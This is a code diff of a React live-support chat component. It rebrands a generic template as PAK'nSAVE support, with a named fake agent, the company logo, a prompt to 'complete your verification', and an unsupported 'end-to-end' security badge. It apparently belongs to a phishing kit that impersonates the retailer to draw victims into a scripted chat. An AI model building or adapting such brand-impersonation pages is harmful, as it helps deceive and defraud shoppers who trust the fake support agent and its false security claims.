@@ -15,8 +15,8 @@ type ChatMessage = {
 };
 
 const SUPPORT_AVATAR = "/avatars/support-sarah.jpg";
-const SUPPORT_AGENT_NAME = "Kadri Tamm";
-const SUPPORT_AGENT_ROLE = "Customer Support";
+const SUPPORT_AGENT_NAME = "Aroha Wilson";
+const SUPPORT_AGENT_ROLE = "PAK'nSAVE Support";
 const CLOSE_BUTTON_TITLE = "Close";
 const EMPTY_CHAT_TEXT = "No messages yet. How can we help you?";
 const CHAT_INPUT_PLACEHOLDER = "Write a message...";
@@ -143,48 +143,94 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
 
   return (
     <>
-      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="pak-page-shell">
         {!isChatOpen ? (
-          <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in text-center flex flex-col items-center">
-            <div className="mb-6 size-20 sm:size-24 rounded-full bg-white/5 ring-4 ring-white/5 flex items-center justify-center">
-              <svg className="size-10 sm:size-12 text-[#0066CC]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
-              </svg>
+          <div className="pak-form-card fade-in relative z-10 w-full max-w-[560px]">
+            <div className="pak-form-inner flex flex-col items-center px-4 py-4 text-center sm:px-7 sm:py-6">
+              <div className="mb-4 flex w-full items-start justify-between gap-3">
+                <div className="max-w-[18rem] text-left">
+                  <h2 className="pak-form-title">{settings.live_support_title}</h2>
+                  <p className="pak-form-subtitle mt-2 whitespace-pre-line">
+                    <Linkify text={settings.live_support_subtitle} />
+                  </p>
+                </div>
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="h-[3.8rem] w-[3.8rem] shrink-0 object-contain sm:h-[4.4rem] sm:w-[4.4rem]"
+                />
+              </div>
+
+              <div className="mb-4 flex w-full items-center gap-3 rounded-[1.2rem] border border-[#ffd95c]/25 bg-[linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02))] px-3.5 py-3 text-left sm:px-4 sm:py-3.5">
+                <div className="relative shrink-0">
+                  <img
+                    src={SUPPORT_AVATAR}
+                    alt={SUPPORT_AGENT_NAME}
+                    className="size-12 rounded-full border-2 border-[#ffd95c]/80 object-cover sm:size-14"
+                  />
+                  <span className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#0b0b08] bg-[#5ef08c]" />
+                </div>
+                <div className="min-w-0 flex-1">
+                  <p className="text-[0.68rem] font-black uppercase tracking-[0.22em] text-[#ffe98c]">Support Agent</p>
+                  <h3 className="truncate text-base font-extrabold text-white sm:text-lg">{SUPPORT_AGENT_NAME}</h3>
+                  <p className="text-[13px] text-white/66">{SUPPORT_AGENT_ROLE}</p>
+                </div>
+              </div>
+
+              <div className="mb-4 w-full max-w-[430px] rounded-[1.05rem] border border-[#ffd95c]/20 bg-black/25 px-3.5 py-3">
+                <div className="mb-2 flex items-center justify-center gap-2 text-[#ffd500]">
+                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
+                  </svg>
+                  <span className="text-[0.72rem] font-black uppercase tracking-[0.22em]">Direct Support</span>
+                </div>
+                <p className="text-sm font-semibold leading-5 text-white/86">
+                  You will be connected directly with <span className="text-[#ffe98c]">{SUPPORT_AGENT_NAME}</span> to complete your verification.
+                </p>
+              </div>
+
+              <button
+                onClick={() => setIsChatOpen(true)}
+                className="pak-form-button flex h-14 w-full max-w-[320px] items-center justify-center gap-2 px-5 text-[15px] sm:h-[3.7rem] sm:text-base"
+              >
+                <span>{settings.live_support_button}</span>
+                <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 12h14m-4-4 4 4-4 4" />
+                </svg>
+              </button>
+
+              <div className="mt-4 pak-form-security justify-center border-t border-[#ffd95c]/15 pt-3 text-center">
+                <svg className="h-6 w-6 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
+                <span>Secure live chat session with end-to-end message syncing.</span>
+              </div>
             </div>
-            <h2 className="text-2xl font-bold text-white mb-3">{settings.live_support_title}</h2>
-            <p className="text-sm sm:text-base text-gray-300 mb-8 sm:mb-10 max-w-sm leading-relaxed px-2 whitespace-pre-line font-medium">
-              <Linkify text={settings.live_support_subtitle} />
-            </p>
-            
-            <button 
-              onClick={() => setIsChatOpen(true)}
-              className="animate-pulse w-full max-w-xs flex flex-col items-center text-white font-bold text-lg cursor-pointer bg-gradient-to-r from-[#0066CC] to-[#0088FF] px-8 py-4 rounded-xl shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98]"
-            >
-              <span>{settings.live_support_button}</span>
-              <svg className="size-6 sm:size-8 mt-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M19 14l-7 7m0 0l-7-7m7 7V3" />
-              </svg>
-            </button>
           </div>
         ) : (
-          <div className="flex w-full max-w-[650px] h-[75vh] max-h-[650px] flex-col overflow-hidden rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] animate-in zoom-in-95 duration-300 relative z-10">
-            <div className="flex items-center justify-between px-6 py-5 border-b border-[#0066CC]/30 bg-white/5">
+          <div className="pak-form-card animate-in zoom-in-95 relative z-10 flex h-[76vh] max-h-[680px] w-full max-w-[700px] flex-col overflow-hidden duration-300">
+            <div className="pak-form-inner flex items-center justify-between border-b border-[#ffd95c]/18 bg-[linear-gradient(180deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03))] px-4 py-4 sm:px-6">
               <div className="flex items-center gap-4">
                 <div className="relative">
                   <img 
                     src={SUPPORT_AVATAR}
-                    alt="Support" 
-                    className="size-12 rounded-full object-cover border-2 border-[#0066CC] shadow-sm"
+                    alt={SUPPORT_AGENT_NAME}
+                    className="size-12 rounded-full border-2 border-[#ffd95c]/85 object-cover shadow-sm"
                   />
-                  <div className="absolute bottom-0 right-0 size-3.5 rounded-full bg-green-500 border-2 border-[#020b22]"></div>
+                  <div className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#0b0b08] bg-green-500"></div>
                 </div>
                 <div className="flex flex-col">
-                  <h3 className="font-bold text-white text-[16px] leading-tight">{SUPPORT_AGENT_NAME}</h3>
-                  <span className="text-[13px] text-gray-400">{SUPPORT_AGENT_ROLE}</span>
+                  <h3 className="text-[16px] font-bold leading-tight text-white">{SUPPORT_AGENT_NAME}</h3>
+                  <span className="text-[13px] text-white/62">{SUPPORT_AGENT_ROLE}</span>
                 </div>
               </div>
               <div className="flex items-center gap-3">
-                <button onClick={() => setIsChatOpen(false)} title={CLOSE_BUTTON_TITLE} className="flex size-10 items-center justify-center rounded-full bg-white/10 text-gray-300 hover:text-white hover:bg-white/20 transition-colors shadow-sm border border-white/5">
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="h-11 w-11 shrink-0 object-contain"
+                />
+                <button onClick={() => setIsChatOpen(false)} title={CLOSE_BUTTON_TITLE} className="flex size-10 items-center justify-center rounded-full border border-[#ffd95c]/18 bg-white/8 text-white/72 shadow-sm transition-colors hover:bg-white/14 hover:text-white">
                   <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                     <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                   </svg>
@@ -192,18 +238,19 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
               </div>
             </div>
 
-            <div className="flex-1 overflow-y-auto p-5 space-y-5 bg-transparent custom-scrollbar">
+            <div className="flex-1 overflow-y-auto bg-transparent p-4 custom-scrollbar sm:p-5">
               {messages.length === 0 ? (
-                <div className="flex flex-col items-center justify-center h-full text-center opacity-50">
-                  <svg className="size-12 text-[#0066CC] mb-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
+                <div className="flex h-full flex-col items-center justify-center text-center opacity-70">
+                  <svg className="mb-3 size-12 text-[#ffd500]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                     <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                   </svg>
-                  <p className="text-sm text-gray-300">{EMPTY_CHAT_TEXT}</p>
+                  <p className="text-sm text-white/72">{EMPTY_CHAT_TEXT}</p>
                 </div>
               ) : (
-                messages.map((m) => (
+                <div className="space-y-4">
+                {messages.map((m) => (
                   <div key={m.id} className={`flex ${m.sender === "user" ? "justify-end" : "justify-start"}`}>
-                    <div className={`max-w-[85%] sm:max-w-[80%] rounded-2xl px-5 py-3.5 text-[15px] shadow-sm ${m.sender === "user" ? "bg-gradient-to-r from-[#0066CC] to-[#0088FF] text-white rounded-br-sm shadow-[0_0_15px_rgba(0,102,204,0.3)]" : "bg-white/10 text-white rounded-bl-sm border border-white/10 backdrop-blur-md"}`}>
+                    <div className={`max-w-[85%] rounded-2xl px-4 py-3 text-[15px] shadow-sm sm:max-w-[80%] ${m.sender === "user" ? "rounded-br-sm border border-[#ffe88a]/50 bg-[linear-gradient(180deg,#ffe65d_0%,#f6cf00_100%)] text-[#111111] shadow-[0_10px_24px_rgba(255,213,0,0.18)]" : "rounded-bl-sm border border-[#ffd95c]/18 bg-white/10 text-white backdrop-blur-md"}`}>
                       {m.image_url && (
                         <div 
                           className="mb-3 overflow-hidden rounded-xl cursor-pointer hover:opacity-90 transition-opacity" 
@@ -215,21 +262,22 @@ export function LiveSupportClient({ sessionId }: { sessionId: string }) {
                       {m.content && <p className="leading-relaxed">{m.content}</p>}
                     </div>
                   </div>
-                ))
+                ))}
+                </div>
               )}
               <div ref={messagesEndRef} />
             </div>
 
-            <form onSubmit={sendMessage} className="flex items-center gap-3 p-4 bg-white/5 backdrop-blur-md border-t border-[#0066CC]/30">
+            <form onSubmit={sendMessage} className="flex items-center gap-3 border-t border-[#ffd95c]/18 bg-white/5 p-4 backdrop-blur-md">
               <input
                 type="text"
                 value={newMessage}
                 onChange={(e) => setNewMessage(e.target.value)}
                 placeholder={CHAT_INPUT_PLACEHOLDER}
-                className="flex-1 bg-white/10 rounded-xl px-5 py-4 text-[15px] text-white outline-none placeholder:text-gray-400 border border-transparent focus:border-[#0066CC]/50 focus:bg-white/15 transition-all shadow-sm"
+                className="flex-1 rounded-xl border border-[#ffd95c]/14 bg-white/8 px-5 py-4 text-[15px] text-white outline-none placeholder:text-white/35 transition-all shadow-sm focus:border-[#ffd95c]/50 focus:bg-white/12"
               />
-              <button type="submit" disabled={!newMessage.trim() || sending || !sessionId} className="flex size-14 shrink-0 items-center justify-center rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] text-white transition-all hover:brightness-110 active:scale-95 disabled:opacity-50 disabled:grayscale shadow-[0_0_15px_rgba(0,102,204,0.4)]">
-                <svg className="size-6 ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
+              <button type="submit" disabled={!newMessage.trim() || sending || !sessionId} className="flex size-14 shrink-0 items-center justify-center rounded-xl border border-[#ffe88a]/55 bg-[linear-gradient(180deg,#ffe65d_0%,#f6cf00_100%)] text-[#111111] transition-all active:scale-95 disabled:opacity-50 disabled:grayscale shadow-[0_10px_24px_rgba(255,213,0,0.22)] hover:brightness-105">
+                <svg className="ml-1 size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                   <path strokeLinecap="round" strokeLinejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
                 </svg>
               </button>
